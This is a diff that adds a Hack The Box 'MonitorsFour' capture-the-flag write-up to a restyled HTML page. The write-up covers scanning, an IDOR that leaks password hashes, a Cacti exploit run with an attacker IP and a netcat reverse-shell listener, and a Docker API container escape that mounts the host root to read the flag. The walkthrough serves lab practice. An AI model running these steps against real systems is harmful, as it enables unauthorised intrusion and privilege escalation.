@@ -1,288 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<title>HTB MonitorsFour Writeup</title>
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"/>
+
 <style>
+
 /* =========================
    GLOBAL
 ========================= */
 
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
 }
 
-html {
-  -webkit-print-color-adjust: exact;
-  scroll-behavior: smooth;
+html{
+    scroll-behavior:smooth;
 }
 
-body {
-  background: #0f172a;
-  color: #e2e8f0;
-  font-family: "Segoe UI", Arial, sans-serif;
-  line-height: 1.8;
-  max-width: 1100px;
-  margin: auto;
-  padding: 40px 28px;
-}
-
-/* =========================
-   TYPOGRAPHY
-========================= */
-
-.page-title {
-  font-size: 3rem;
-  margin-bottom: 15px;
-  color: #f8fafc;
-  font-weight: 700;
-  border-bottom: 2px solid #1e293b;
-  padding-bottom: 20px;
-}
-
-h1,
-h2,
-h3,
-h4 {
-  color: #f8fafc;
-  margin-top: 40px;
-  margin-bottom: 18px;
-  line-height: 1.3;
-}
-
-h1 {
-  font-size: 2.3rem;
-}
-
-h2 {
-  font-size: 1.8rem;
-  border-left: 5px solid #38bdf8;
-  padding-left: 14px;
-}
-
-h3 {
-  font-size: 1.4rem;
-  color: #7dd3fc;
-}
-
-h4 {
-  font-size: 1.15rem;
-  color: #cbd5e1;
-}
-
-p {
-  margin: 14px 0;
-  color: #cbd5e1;
+body{
+    background:#0a0a0a;
+    color:#e5e5e5;
+    font-family:Arial, Helvetica, sans-serif;
+    line-height:1.8;
+    max-width:1100px;
+    margin:auto;
+    padding:40px 28px;
 }
 
 /* =========================
-   LINKS
+   PAGE TITLE
 ========================= */
 
-a {
-  color: #38bdf8;
-  text-decoration: none;
-  transition: 0.2s ease;
-}
-
-a:hover {
-  color: #7dd3fc;
-  text-decoration: underline;
+.page-title{
+    font-size:3rem;
+    font-weight:700;
+    color:#ffffff;
+    margin-bottom:20px;
+    border-bottom:2px solid #1f1f1f;
+    padding-bottom:20px;
 }
 
 /* =========================
-   CODE BLOCKS
+   HEADINGS
 ========================= */
 
-.code,
-pre {
-  background: #111827 !important;
-  border: 1px solid #1e293b;
-  border-radius: 14px;
-  padding: 20px !important;
-  overflow-x: auto;
-  margin: 25px 0;
-  box-shadow: 0 0 0 1px rgba(255,255,255,0.02);
+h1,h2,h3,h4{
+    color:#ffffff;
+    margin-top:45px;
+    margin-bottom:18px;
+    line-height:1.3;
 }
 
-code {
-  font-family: "JetBrains Mono", monospace;
-  color: #7dd3fc;
-  background: rgba(56, 189, 248, 0.12);
-  padding: 3px 7px;
-  border-radius: 6px;
-  font-size: 0.95rem;
+h2{
+    font-size:1.9rem;
+    border-left:4px solid #444;
+    padding-left:14px;
 }
 
-pre code {
-  background: transparent;
-  padding: 0;
-  color: #e2e8f0;
-  font-size: 0.95rem;
+h3{
+    font-size:1.4rem;
+    color:#d4d4d4;
+}
+
+h4{
+    font-size:1.15rem;
+    color:#c0c0c0;
+}
+
+/* =========================
+   TEXT
+========================= */
+
+p{
+    margin:16px 0;
+    color:#d1d1d1;
+}
+
+a{
+    color:#cfcfcf;
+    text-decoration:none;
+    border-bottom:1px solid #555;
+    transition:0.2s ease;
+}
+
+a:hover{
+    color:#ffffff;
+    border-color:#ffffff;
+}
+
+/* =========================
+   CODE
+========================= */
+
+pre{
+    background:#111111 !important;
+    border:1px solid #232323;
+    border-radius:14px;
+    padding:22px !important;
+    overflow-x:auto;
+    margin:28px 0;
+    box-shadow:
+        0 0 0 1px rgba(255,255,255,0.02),
+        0 10px 25px rgba(0,0,0,0.35);
+}
+
+code{
+    font-family:"JetBrains Mono", monospace;
+    background:#1a1a1a;
+    color:#f5f5f5;
+    padding:3px 7px;
+    border-radius:6px;
+    font-size:0.95rem;
+}
+
+pre code{
+    background:transparent;
+    padding:0;
 }
 
 /* =========================
    IMAGES
 ========================= */
 
-.image img,
-figure img {
-  width: 100%;
-  border-radius: 16px;
-  border: 1px solid #1e293b;
-  transition: transform 0.25s ease;
-  box-shadow:
-    0 10px 25px rgba(0,0,0,0.35),
-    0 0 0 1px rgba(255,255,255,0.03);
+figure{
+    margin:35px 0;
 }
 
-.image img:hover,
-figure img:hover {
-  transform: scale(1.01);
+figure img{
+    width:100%;
+    border-radius:16px;
+    border:1px solid #232323;
+    box-shadow:
+        0 15px 35px rgba(0,0,0,0.45),
+        0 0 0 1px rgba(255,255,255,0.03);
+    transition:0.25s ease;
 }
 
-figure {
-  margin: 35px 0;
-}
-
-figcaption {
-  text-align: center;
-  margin-top: 12px;
-  color: #94a3b8;
-  font-size: 0.92rem;
-}
-
-/* =========================
-   BLOCKQUOTES
-========================= */
-
-blockquote {
-  border-left: 4px solid #38bdf8;
-  background: #111827;
-  padding: 18px 22px;
-  margin: 25px 0;
-  border-radius: 12px;
-  color: #cbd5e1;
-}
-
-/* =========================
-   TABLES
-========================= */
-
-table {
-  width: 100%;
-  border-collapse: collapse;
-  margin: 30px 0;
-  overflow: hidden;
-  border-radius: 12px;
-}
-
-th {
-  background: #1e293b;
-  color: #f8fafc;
-  font-weight: 600;
-}
-
-td,
-th {
-  border: 1px solid #334155;
-  padding: 14px;
-}
-
-td {
-  background: #0f172a;
-  color: #cbd5e1;
+figure img:hover{
+    transform:scale(1.01);
 }
 
 /* =========================
    LISTS
 ========================= */
 
-ul,
-ol {
-  padding-left: 25px;
-  margin: 18px 0;
+ul,ol{
+    padding-left:24px;
+    margin:18px 0;
 }
 
-li {
-  margin-bottom: 10px;
-  color: #cbd5e1;
+li{
+    margin-bottom:10px;
+}
+
+/* =========================
+   BLOCKQUOTE
+========================= */
+
+blockquote{
+    background:#111111;
+    border-left:4px solid #555;
+    padding:20px;
+    margin:28px 0;
+    border-radius:12px;
+    color:#d1d1d1;
+}
+
+/* =========================
+   TABLES
+========================= */
+
+table{
+    width:100%;
+    border-collapse:collapse;
+    margin:30px 0;
+}
+
+th{
+    background:#141414;
+    color:#ffffff;
+}
+
+td,th{
+    border:1px solid #2a2a2a;
+    padding:14px;
+}
+
+td{
+    background:#0f0f0f;
 }
 
 /* =========================
    HR
 ========================= */
 
-hr {
-  border: none;
-  height: 1px;
-  background: #1e293b;
-  margin: 50px 0;
-}
-
-/* =========================
-   CALLOUTS
-========================= */
-
-.callout {
-  background: #111827;
-  border: 1px solid #1e293b;
-  border-left: 5px solid #38bdf8;
-  padding: 20px;
-  border-radius: 14px;
-  margin: 25px 0;
-}
-
-/* =========================
-   TOC LINKS
-========================= */
-
-.table_of_contents-link {
-  color: #94a3b8;
-  border-bottom: 1px solid #334155;
-}
-
-.table_of_contents-link:hover {
-  color: #38bdf8;
+hr{
+    border:none;
+    height:1px;
+    background:#1f1f1f;
+    margin:50px 0;
 }
 
 /* =========================
    SCROLLBAR
 ========================= */
 
-::-webkit-scrollbar {
-  width: 10px;
+::-webkit-scrollbar{
+    width:10px;
 }
 
-::-webkit-scrollbar-track {
-  background: #0f172a;
+::-webkit-scrollbar-track{
+    background:#0a0a0a;
 }
 
-::-webkit-scrollbar-thumb {
-  background: #334155;
-  border-radius: 10px;
+::-webkit-scrollbar-thumb{
+    background:#2d2d2d;
+    border-radius:10px;
 }
 
-::-webkit-scrollbar-thumb:hover {
-  background: #475569;
+::-webkit-scrollbar-thumb:hover{
+    background:#444;
 }
 
 /* =========================
    RESPONSIVE
 ========================= */
 
-@media (max-width: 768px) {
-  body {
-    padding: 24px 18px;
-  }
+@media(max-width:768px){
 
-  .page-title {
-    font-size: 2.2rem;
-  }
+    body{
+        padding:24px 18px;
+    }
 
-  h2 {
-    font-size: 1.5rem;
-  }
+    .page-title{
+        font-size:2.2rem;
+    }
 
-  pre {
-    padding: 16px !important;
-  }
+    h2{
+        font-size:1.5rem;
+    }
+
+    pre{
+        padding:18px !important;
+    }
 }
+
 </style>
+</head>
+
+<body>
+
+<article class="page sans">
+
+<header>
+    <h1 class="page-title">HTB MonitorsFour Writeup</h1>
+</header>
+
+<div class="page-body">
+
+<h2>Scanning</h2>
+
+<p>
+We run an nmap scan as follows:
+</p>
+
+<pre><code class="language-bash">
+nmap -A -p- 10.129.1.46
+</code></pre>
+
+<pre><code class="language-bash">
+Starting Nmap 7.95 at 2026-05-20 16:42 EDT
+Nmap scan report for 10.129.1.46
+Host is up (0.074s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0
+</code></pre>
+
+<h2>Directory Scanning</h2>
+
+<p>
+We check for directories using gobuster:
+</p>
+
+<pre><code class="language-bash">
+gobuster dir -u http://monitorsfour.htb \
+-w /usr/share/wordlists/seclists/
+</code></pre>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image.png">
+</figure>
+
+<p>
+The <code>/controllers</code> route returned a 403 forbidden response.
+The <code>/user</code> endpoint looked more interesting.
+</p>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image1.png">
+</figure>
+
+<p>
+We added a token parameter:
+<code>http://monitorsfour.htb/user?token=0</code>
+</p>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image2.png">
+</figure>
+
+<p>
+The password values appeared to be hashes, so they were checked
+against CrackStation.
+</p>
+
+<h2>Admin Login</h2>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image3.png">
+</figure>
+
+<p>
+After logging in successfully, no immediate attack vector was found,
+so virtual host enumeration was performed.
+</p>
+
+<h3>VHost Enumeration</h3>
+
+<pre><code class="language-bash">
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+-u http://monitorsfour.htb \
+-H 'Host: FUZZ.monitorsfour.htb'
+</code></pre>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image4.png">
+</figure>
+
+<p>
+The valid subdomain discovered was:
+<code>cacti.monitorsfour.htb</code>
+</p>
+
+<h2>Cacti Login</h2>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image5.png">
+</figure>
+
+<p>
+The credentials worked with the username:
+<code>marcus</code>
+</p>
+
+<h3>Exploit</h3>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image6.png">
+</figure>
+
+<p>
+An exploit matching the disclosed Cacti version was identified and used.
+</p>
+
+<h2>Initial Foothold</h2>
+
+<pre><code class="language-bash">
+python3 monitorsfour.py \
+-u marcus \
+-p &lt;REDACTED&gt; \
+-i &lt;attacker_ip&gt; \
+-url http://cacti.monitorsfour.htb \
+-l 9001
+</code></pre>
+
+<pre><code class="language-bash">
+nc -lvnp 9001
+</code></pre>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image7.png">
+</figure>
+
+<h2>User Flag</h2>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image8.png">
+</figure>
+
+<h2>Root Flag</h2>
+
+<h3>Privilege Escalation (CVE-2025-9074)</h3>
+
+<p>
+The shell was inside a Docker container, requiring container escape
+to access the host filesystem.
+</p>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image9.png">
+</figure>
+
+<pre><code class="language-bash">
+for i in $(seq 1 254); do
+(
+curl -s --connect-timeout 1 \
+http://192.168.65.$i:2375/version \
+2>/dev/null | grep -q "ApiVersion" \
+&& echo "192.168.65.$i:2375 OPEN"
+) &
+done
+wait
+</code></pre>
+
+<h4>Enumerate Docker Images</h4>
+
+<pre><code class="language-bash">
+curl -s http://192.168.65.7:2375/images/json
+</code></pre>
+
+<pre><code class="language-json">
+{
+  "Image": "alpine:latest",
+  "Cmd": [
+    "/bin/sh",
+    "-c",
+    "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"
+  ]
+}
+</code></pre>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image10.png">
+</figure>
+
+<figure>
+<img src="../../../assets/writeups/htb/MonitorsFour/image11.png">
+</figure>
+
+</div>
+</article>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+</body>
+</html>
